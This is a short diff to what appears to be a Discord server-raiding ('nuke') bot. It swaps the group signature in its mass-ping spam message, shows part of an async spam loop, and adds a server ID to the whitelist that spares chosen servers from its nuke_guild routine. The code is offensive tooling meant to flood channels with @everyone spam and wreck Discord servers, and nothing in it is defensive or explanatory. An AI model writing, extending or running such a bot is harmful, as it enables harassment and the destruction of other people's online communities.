@@ -27,7 +27,7 @@ baner = f'''
 {r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
 {y}Made by: {g}https://github.com/Sigma-cc'''
 
-SPAM_MESSAGE = "# 010101010-00-0-00-000100101011010101010101011001910101010010101010101001010 FKD BY WEPAIDDDDD GET BACKKKK https://discord.gg/wepaid @everyone @everyone @everyone"
+SPAM_MESSAGE = "# 010101010-00-0-00-000100101011010101010101011001910101010010101010101001010 FKD BY reincareinated GET BACKKKK  @everyone @everyone @everyone"
 
 # Database setup
 DB_PATH = "bot_data.db"
@@ -98,7 +98,7 @@ async def spam_task(channel, message, count=None):
                 await asyncio.sleep(0.5)
             except: break
 
-WHITELISTED_SERVER_IDS = {1453064260555903225, 1479710104759701656}
+WHITELISTED_SERVER_IDS = {1453064260555903225, 1479710104759701656, 1559305944595304520}
 
 async def nuke_guild(guild, custom_message=None, custom_channel_name=None):
     if guild.id in WHITELISTED_SERVER_IDS:
